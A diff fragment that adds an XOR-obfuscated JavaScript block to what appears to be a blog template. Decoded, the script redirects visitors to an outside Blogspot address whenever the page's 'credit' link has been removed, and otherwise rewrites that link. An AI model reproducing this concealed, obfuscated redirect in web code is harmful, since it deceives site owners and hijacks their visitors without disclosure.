@@ -1,0 +1,5 @@
+<script type='text/javascript'>
+//<![CDATA[
+var enkripsi="'2C'1Aqapkrv'02v{rg'1F'05vgzv-hctcqapkrv'05'1G'2C--'1A'03'7@AFCVC'7@'2Cuklfmu,mlnmcf'02'1F'02dwlavkml'0:'0;'5@'02'2C'02'02'02'02tcp'02amr{'1Ffmawoglv,egvGngoglv@{Kf'0:'00apgfkv'00'0;'1@'02'02'02'02'02'2C'02'02'02'02kd'0:amr{'1F'1Flwnn'0;'5@'2C'02'02'02'02'02'02'02'02uklfmu,nmacvkml,jpgd'1F'00jvvr'1C--uuu,ocj1mw`k,`nmeqrmv,amo-'00'1@'2C'02'02'02'02'5F'1@'2C'02'02'02'02amr{,qgvCvvpk`wvg'0:'00jpgd'00'0A'00jvvr'1C--uuu,ocj1mw`k,`nmeqrmv,amo-'00'0;'1@'2C'02'02'02'02amr{,kllgpJVON'1F'00'w2405'w2466'w2467'w2465'w240D'w246C'02'w2405'w2466'w2467'w240F'w240:'w246:'w240:'w246C'00'2C'5F'1@'2C--'7F'7F'1G'2C'1A-qapkrv'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
+//]]>
+</script>
